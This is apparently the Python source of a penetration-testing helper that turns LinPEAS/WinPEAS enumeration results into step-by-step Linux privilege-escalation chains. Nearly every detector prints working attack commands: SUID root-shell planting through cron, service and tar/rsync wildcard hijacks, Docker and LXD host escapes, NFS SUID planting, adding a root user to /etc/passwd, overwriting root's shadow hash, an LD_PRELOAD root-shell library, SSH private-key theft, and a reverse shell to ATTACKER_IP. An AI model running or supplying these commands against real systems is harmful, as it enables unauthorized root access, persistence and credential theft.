"""Multi-step privilege escalation chain detection.

Identifies complex attack chains that require multiple steps.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Optional, Callable

from .analyzer import ExploitationPath, Category, Confidence, Risk


@dataclass
class ChainStep:
    """A single step in an attack chain."""
    order: int
    description: str
    commands: list[str] = field(default_factory=list)
    prerequisites: list[str] = field(default_factory=list)
    output: str = ""  # What this step produces


@dataclass
class AttackChain:
    """A multi-step privilege escalation chain."""
    name: str
    description: str
    steps: list[ChainStep] = field(default_factory=list)
    total_steps: int = 0
    confidence: Confidence = Confidence.MEDIUM
    risk: Risk = Risk.MEDIUM
    prerequisites: list[str] = field(default_factory=list)
    notes: str = ""
    references: list[str] = field(default_factory=list)

    # Scoring
    reliability_score: int = 50
    complexity_score: int = 50  # Inverse of simplicity

    def __post_init__(self):
        self.total_steps = len(self.steps)


class ChainDetector:
    """Detects multi-step privilege escalation chains."""

    def __init__(self):
        """Initialize chain detector."""
        self._chain_detectors: list[Callable] = [
            self._detect_path_hijack_cron,
            self._detect_writable_script_cron,
            self._detect_docker_escape,
            self._detect_lxd_escape,
            self._detect_nfs_suid_plant,
            self._detect_writable_passwd,
            self._detect_writable_shadow,
            self._detect_service_hijack,
            self._detect_library_hijack,
            self._detect_ssh_key_access,
            self._detect_wildcard_injection,
            self._detect_sudo_path_injection,
        ]

    def detect_chains(self, results) -> list[AttackChain]:
        """Detect all possible attack chains from enumeration results.

        Args:
            results: Parsed enumeration results (LinPEAS or WinPEAS)

        Returns:
            List of detected attack chains
        """
        chains = []

        for detector in self._chain_detectors:
            try:
                chain = detector(results)
                if chain:
                    if isinstance(chain, list):
                        chains.extend(chain)
                    else:
                        chains.append(chain)
            except (AttributeError, TypeError) as e:
                # Skip detectors that don't apply to this result type
                logging.getLogger(__name__).debug(f"Chain detector {detector.__name__} skipped: {e}")
                continue

        return chains

    def _detect_path_hijack_cron(self, results) -> Optional[AttackChain]:
        """Detect PATH hijack via cron jobs."""
        cron_jobs = getattr(results, 'cron_jobs', [])
        writable_path = getattr(results, 'path_writable', [])

        # Find cron jobs with relative paths
        relative_path_crons = []
        for cron in cron_jobs:
            if cron.command and not cron.command.startswith('/'):
                # Get the command name
                cmd_parts = cron.command.split()
                if cmd_parts:
                    cmd = cmd_parts[0]
                    if not cmd.startswith('/') and not cmd.startswith('.'):
                        relative_path_crons.append((cron, cmd))

        if not relative_path_crons or not writable_path:
            return None

        cron, cmd_name = relative_path_crons[0]  # Use first found

        return AttackChain(
            name="Cron PATH Hijack",
            description=f"Cron job '{cron.command}' uses relative path '{cmd_name}' - can be hijacked via writable PATH",
            steps=[
                ChainStep(
                    order=1,
                    description=f"Identify writable directory in cron's PATH",
                    commands=[
                        "echo $PATH",
                        f"# Writable directories found: {', '.join(writable_path[:3])}"
                    ],
                    output="Writable PATH directory"
                ),
                ChainStep(
                    order=2,
                    description=f"Create malicious '{cmd_name}' script",
                    commands=[
                        f"cat > {writable_path[0]}/{cmd_name} << 'EOF'",
                        "#!/bin/bash",
                        "cp /bin/bash /tmp/rootbash",
                        "chmod +s /tmp/rootbash",
                        "EOF",
                        f"chmod +x {writable_path[0]}/{cmd_name}"
                    ],
                    output="Malicious script in PATH"
                ),
                ChainStep(
                    order=3,
                    description="Wait for cron execution",
                    commands=[
                        f"# Cron schedule: {cron.schedule}",
                        "# Wait for cron to run, then:",
                        "/tmp/rootbash -p"
                    ],
                    output="Root shell"
                )
            ],
            confidence=Confidence.HIGH,
            risk=Risk.LOW,
            reliability_score=85,
            complexity_score=30,
            notes="Timing depends on cron schedule"
        )

    def _detect_writable_script_cron(self, results) -> Optional[list[AttackChain]]:
        """Detect writable cron script chains."""
        cron_jobs = getattr(results, 'cron_jobs', [])
        chains = []

        for cron in cron_jobs:
            if cron.writable:
                script_path = cron.command.split()[0] if cron.command else ""

                chain = AttackChain(
                    name="Writable Cron Script",
                    description=f"Cron executes writable script: {script_path}",
                    steps=[
                        ChainStep(
                            order=1,
                            description="Backup original script (optional)",
                            commands=[f"cp {script_path} {script_path}.bak"],
                            output="Backup of original script"
                        ),
                        ChainStep(
                            order=2,
                            description="Inject payload into script",
                            commands=[
                                f"echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> {script_path}",
                                "# Or for reverse shell:",
                                f"echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> {script_path}"
                            ],
                            output="Modified cron script"
                        ),
                        ChainStep(
                            order=3,
                            description="Wait for cron and execute payload",
                            commands=[
                                f"# Wait for: {cron.schedule}",
                                "/tmp/rootbash -p"
                            ],
                            output="Root shell"
                        )
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    reliability_score=95,
                    complexity_score=20
                )
                chains.append(chain)

        return chains if chains else None

    def _detect_docker_escape(self, results) -> Optional[AttackChain]:
        """Detect Docker container escape."""
        docker_info = getattr(results, 'docker', None)
        groups = getattr(results, 'current_groups', [])

        if not docker_info:
            return None

        # Docker group membership
        if docker_info.docker_group_member or 'docker' in groups:
            return AttackChain(
                name="Docker Group Escape",
                description="Member of docker group - can mount host filesystem",
                steps=[
                    ChainStep(
                        order=1,
                        description="Verify docker access",
                        commands=["docker ps", "docker images"],
                        output="Docker access confirmed"
                    ),
                    ChainStep(
                        order=2,
                        description="Create privileged container with host filesystem",
                        commands=[
                            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                            "# Now you have root access to host filesystem"
                        ],
                        output="Root shell on host"
                    ),
                    ChainStep(
                        order=3,
                        description="Alternative: Create SUID binary",
                        commands=[
                            "docker run -v /:/mnt --rm -it alpine sh -c 'cp /mnt/bin/bash /mnt/tmp/rootbash && chmod +s /mnt/tmp/rootbash'",
                            "exit",
                            "/tmp/rootbash -p"
                        ],
                        output="Persistent root access"
                    )
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                references=["https://gtfobins.github.io/gtfobins/docker/"],
                reliability_score=95,
                complexity_score=15
            )

        # Docker socket accessible
        if docker_info.docker_socket_accessible:
            return AttackChain(
                name="Docker Socket Escape",
                description="Docker socket is accessible",
                steps=[
                    ChainStep(
                        order=1,
                        description="Verify socket access",
                        commands=["ls -la /var/run/docker.sock"],
                        output="Socket is accessible"
                    ),
                    ChainStep(
                        order=2,
                        description="Use docker via socket",
                        commands=[
                            "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
                        ],
                        output="Root shell on host"
                    )
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=95,
                complexity_score=20
            )

        return None

    def _detect_lxd_escape(self, results) -> Optional[AttackChain]:
        """Detect LXD/LXC container escape."""
        groups = getattr(results, 'current_groups', [])
        lxc_lxd = getattr(results, 'lxc_lxd', False)

        if not (lxc_lxd or 'lxd' in groups or 'lxc' in groups):
            return None

        return AttackChain(
            name="LXD/LXC Container Escape",
            description="Member of lxd/lxc group - can create privileged containers",
            steps=[
                ChainStep(
                    order=1,
                    description="Check LXD initialization",
                    commands=["lxc list", "# If empty, may need: lxd init --auto"],
                    output="LXD is initialized"
                ),
                ChainStep(
                    order=2,
                    description="Build or download Alpine image",
                    commands=[
                        "# Option 1: Download",
                        "git clone https://github.com/saghul/lxd-alpine-builder",
                        "cd lxd-alpine-builder && ./build-alpine",
                        "",
                        "# Option 2: Use existing image",
                        "lxc image list images: | grep alpine"
                    ],
                    output="Alpine image available"
                ),
                ChainStep(
                    order=3,
                    description="Import image and create privileged container",
                    commands=[
                        "lxc image import ./alpine-v*.tar.gz --alias alpine",
                        "lxc init alpine privesc -c security.privileged=true",
                        "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
                    ],
                    output="Privileged container configured"
                ),
                ChainStep(
                    order=4,
                    description="Start container and access host filesystem",
                    commands=[
                        "lxc start privesc",
                        "lxc exec privesc /bin/sh",
                        "# Host filesystem is at /mnt/root"
                    ],
                    output="Root access to host filesystem"
                )
            ],
            confidence=Confidence.HIGH,
            risk=Risk.LOW,
            reliability_score=90,
            complexity_score=40
        )

    def _detect_nfs_suid_plant(self, results) -> Optional[list[AttackChain]]:
        """Detect NFS no_root_squash SUID planting."""
        nfs_shares = getattr(results, 'nfs_no_root_squash', [])
        hostname = getattr(results, 'hostname', 'TARGET')

        if not nfs_shares:
            return None

        chains = []
        for share in nfs_shares:
            chain = AttackChain(
                name=f"NFS no_root_squash: {share}",
                description="NFS share with no_root_squash allows SUID binary planting",
                steps=[
                    ChainStep(
                        order=1,
                        description="Mount NFS share on attacker machine (as root)",
                        commands=[
                            f"# On attacker machine as root:",
                            "mkdir /tmp/nfs",
                            f"mount -o rw,vers=3 {hostname}:{share} /tmp/nfs"
                        ],
                        prerequisites=["Attacker has root access on attack machine", "NFS client installed"],
                        output="NFS share mounted"
                    ),
                    ChainStep(
                        order=2,
                        description="Create SUID binary",
                        commands=[
                            "# Still on attacker as root:",
                            "cp /bin/bash /tmp/nfs/rootbash",
                            "chmod +s /tmp/nfs/rootbash"
                        ],
                        output="SUID binary planted"
                    ),
                    ChainStep(
                        order=3,
                        description="Execute SUID binary on target",
                        commands=[
                            f"# On target:",
                            f"{share}/rootbash -p"
                        ],
                        output="Root shell"
                    )
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=95,
                complexity_score=30
            )
            chains.append(chain)

        return chains

    def _detect_writable_passwd(self, results) -> Optional[AttackChain]:
        """Detect writable /etc/passwd."""
        writable_files = getattr(results, 'writable_files', [])

        passwd_writable = any(
            '/etc/passwd' in str(f) if hasattr(f, 'path') else '/etc/passwd' in str(f)
            for f in writable_files
        )

        if not passwd_writable:
            # Check raw sections
            raw = getattr(results, 'raw_sections', {})
            for section in raw.values():
                if '/etc/passwd' in section and 'writable' in section.lower():
                    passwd_writable = True
                    break

        if not passwd_writable:
            return None

        return AttackChain(
            name="Writable /etc/passwd",
            description="/etc/passwd is writable - can add root user",
            steps=[
                ChainStep(
                    order=1,
                    description="Generate password hash",
                    commands=[
                        "openssl passwd -1 -salt xyz password123",
                        "# Output: $1$xyz$..."
                    ],
                    output="Password hash"
                ),
                ChainStep(
                    order=2,
                    description="Add new root user",
                    commands=[
                        "echo 'hacker:$1$xyz$hashhash:0:0:root:/root:/bin/bash' >> /etc/passwd"
                    ],
                    output="New root user added"
                ),
                ChainStep(
                    order=3,
                    description="Switch to new user",
                    commands=[
                        "su hacker",
                        "# Password: password123"
                    ],
                    output="Root shell"
                )
            ],
            confidence=Confidence.HIGH,
            risk=Risk.LOW,
            reliability_score=100,
            complexity_score=10
        )

    def _detect_writable_shadow(self, results) -> Optional[AttackChain]:
        """Detect writable /etc/shadow."""
        writable_files = getattr(results, 'writable_files', [])

        shadow_writable = any(
            '/etc/shadow' in str(f) if hasattr(f, 'path') else '/etc/shadow' in str(f)
            for f in writable_files
        )

        if not shadow_writable:
            return None

        return AttackChain(
            name="Writable /etc/shadow",
            description="/etc/shadow is writable - can modify root password",
            steps=[
                ChainStep(
                    order=1,
                    description="Generate new password hash",
                    commands=[
                        "openssl passwd -6 -salt xyz newpassword",
                        "# Or: mkpasswd -m sha-512 newpassword"
                    ],
                    output="SHA-512 password hash"
                ),
                ChainStep(
                    order=2,
                    description="Replace root password hash",
                    commands=[
                        "# Backup first",
                        "cp /etc/shadow /etc/shadow.bak",
                        "# Edit /etc/shadow and replace root's hash",
                        "vim /etc/shadow",
                        "# Or use sed (carefully)"
                    ],
                    output="Root password changed"
                ),
                ChainStep(
                    order=3,
                    description="Switch to root",
                    commands=["su root"],
                    output="Root shell"
                )
            ],
            confidence=Confidence.HIGH,
            risk=Risk.MEDIUM,
            notes="Modifying shadow file may cause issues if done incorrectly",
            reliability_score=95,
            complexity_score=25
        )

    def _detect_service_hijack(self, results) -> Optional[list[AttackChain]]:
        """Detect writable service binaries."""
        # This applies to both Linux and Windows
        chains = []

        # Linux services
        writable_files = getattr(results, 'writable_files', [])
        for wf in writable_files:
            path = wf.path if hasattr(wf, 'path') else str(wf)
            if any(x in path for x in ['/etc/init.d/', '/lib/systemd/', '/usr/lib/systemd/']):
                chain = AttackChain(
                    name=f"Service Hijack: {path}",
                    description=f"Service file is writable: {path}",
                    steps=[
                        ChainStep(
                            order=1,
                            description="Modify service file",
                            commands=[
                                f"# Add payload to service: {path}",
                                f"echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> {path}"
                            ]
                        ),
                        ChainStep(
                            order=2,
                            description="Trigger service restart",
                            commands=[
                                "# Wait for reboot or trigger restart"
                            ]
                        ),
                        ChainStep(
                            order=3,
                            description="Execute payload",
                            commands=["/tmp/rootbash -p"]
                        )
                    ],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.MEDIUM,
                    reliability_score=70,
                    complexity_score=35
                )
                chains.append(chain)

        return chains if chains else None

    def _detect_library_hijack(self, results) -> Optional[AttackChain]:
        """Detect LD_PRELOAD or library path hijacking opportunities."""
        sudo_rights = getattr(results, 'sudo_rights', [])

        # Check for env_keep with LD_PRELOAD
        for sudo in sudo_rights:
            raw = sudo.raw_line.lower() if hasattr(sudo, 'raw_line') else ""
            if 'env_keep' in raw and ('ld_preload' in raw or 'ld_library_path' in raw):
                return AttackChain(
                    name="LD_PRELOAD Privilege Escalation",
                    description="sudo preserves LD_PRELOAD - library injection possible",
                    steps=[
                        ChainStep(
                            order=1,
                            description="Create malicious shared library",
                            commands=[
                                "cat > /tmp/preload.c << 'EOF'",
                                "#include <stdio.h>",
                                "#include <sys/types.h>",
                                "#include <stdlib.h>",
                                "void _init() {",
                                "    unsetenv(\"LD_PRELOAD\");",
                                "    setgid(0);",
                                "    setuid(0);",
                                "    system(\"/bin/bash -p\");",
                                "}",
                                "EOF"
                            ],
                            output="Malicious C code"
                        ),
                        ChainStep(
                            order=2,
                            description="Compile shared library",
                            commands=[
                                "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c"
                            ],
                            output="Compiled .so file"
                        ),
                        ChainStep(
                            order=3,
                            description="Execute with LD_PRELOAD",
                            commands=[
                                f"sudo LD_PRELOAD=/tmp/preload.so {sudo.commands[0] if sudo.commands else 'program'}"
                            ],
                            output="Root shell"
                        )
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    reliability_score=95,
                    complexity_score=35
                )

        return None

    def _detect_ssh_key_access(self, results) -> Optional[list[AttackChain]]:
        """Detect accessible SSH keys."""
        ssh_keys = getattr(results, 'ssh_keys', [])

        if not ssh_keys:
            return None

        chains = []
        for key_path in ssh_keys:
            # Check if it's a private key
            if 'authorized_keys' in key_path:
                continue  # Skip authorized_keys files

            chain = AttackChain(
                name=f"SSH Key Access: {key_path}",
                description=f"SSH private key found: {key_path}",
                steps=[
                    ChainStep(
                        order=1,
                        description="Copy and examine key",
                        commands=[
                            f"cat {key_path}",
                            f"# Copy to attacker machine"
                        ]
                    ),
                    ChainStep(
                        order=2,
                        description="Identify key owner and target",
                        commands=[
                            "# Check .ssh/config for targets",
                            "cat ~/.ssh/config",
                            "cat /etc/passwd  # for user home directories"
                        ]
                    ),
                    ChainStep(
                        order=3,
                        description="Use key for lateral movement or escalation",
                        commands=[
                            "chmod 600 stolen_key",
                            "ssh -i stolen_key user@localhost",
                            "# Or: ssh -i stolen_key root@localhost"
                        ]
                    )
                ],
                confidence=Confidence.MEDIUM,
                risk=Risk.LOW,
                reliability_score=60,
                complexity_score=30
            )
            chains.append(chain)

        return chains if chains else None

    def _detect_wildcard_injection(self, results) -> Optional[list[AttackChain]]:
        """Detect wildcard injection opportunities."""
        cron_jobs = getattr(results, 'cron_jobs', [])
        chains = []

        for cron in cron_jobs:
            cmd = cron.command if hasattr(cron, 'command') else ""

            if '*' not in cmd:
                continue

            # Detect tar wildcard
            if 'tar ' in cmd and '*' in cmd:
                chain = AttackChain(
                    name="Tar Wildcard Injection",
                    description=f"Cron job uses tar with wildcard: {cmd}",
                    steps=[
                        ChainStep(
                            order=1,
                            description="Identify writable directory in tar path",
                            commands=["# Find where tar operates and verify write access"]
                        ),
                        ChainStep(
                            order=2,
                            description="Create malicious filenames",
                            commands=[
                                "echo '' > '--checkpoint=1'",
                                "echo '' > '--checkpoint-action=exec=sh shell.sh'",
                                "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh"
                            ],
                            output="Malicious flag files created"
                        ),
                        ChainStep(
                            order=3,
                            description="Wait for cron and execute",
                            commands=[
                                f"# Wait for: {cron.schedule}",
                                "/tmp/rootbash -p"
                            ]
                        )
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    references=["https://www.exploit-db.com/papers/33930"],
                    reliability_score=85,
                    complexity_score=25
                )
                chains.append(chain)

            # Detect rsync wildcard
            elif 'rsync ' in cmd and '*' in cmd:
                chain = AttackChain(
                    name="Rsync Wildcard Injection",
                    description=f"Cron job uses rsync with wildcard: {cmd}",
                    steps=[
                        ChainStep(
                            order=1,
                            description="Create malicious filename",
                            commands=[
                                "echo '' > '-e sh shell.sh'",
                                "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh"
                            ]
                        ),
                        ChainStep(
                            order=2,
                            description="Wait for cron execution",
                            commands=["/tmp/rootbash -p"]
                        )
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    reliability_score=80,
                    complexity_score=25
                )
                chains.append(chain)

        return chains if chains else None

    def _detect_sudo_path_injection(self, results) -> Optional[AttackChain]:
        """Detect sudo without secure_path."""
        sudo_rights = getattr(results, 'sudo_rights', [])

        # This requires checking if sudo uses secure_path
        # Usually detected in LinPEAS output
        raw = getattr(results, 'raw_sections', {})

        secure_path_disabled = False
        for section in raw.values():
            if 'secure_path' in section.lower() and ('not' in section.lower() or 'disabled' in section.lower()):
                secure_path_disabled = True
                break

        if not secure_path_disabled:
            return None

        return AttackChain(
            name="Sudo PATH Injection",
            description="sudo does not use secure_path - PATH injection possible",
            steps=[
                ChainStep(
                    order=1,
                    description="Find sudo command that calls external binary",
                    commands=[
                        "sudo -l",
                        "# Look for commands that run other binaries without full path"
                    ]
                ),
                ChainStep(
                    order=2,
                    description="Create malicious binary in PATH",
                    commands=[
                        "echo '/bin/bash' > /tmp/malicious",
                        "chmod +x /tmp/malicious",
                        "export PATH=/tmp:$PATH"
                    ]
                ),
                ChainStep(
                    order=3,
                    description="Execute sudo command",
                    commands=["sudo <command>"]
                )
            ],
            confidence=Confidence.MEDIUM,
            risk=Risk.LOW,
            reliability_score=60,
            complexity_score=40
        )
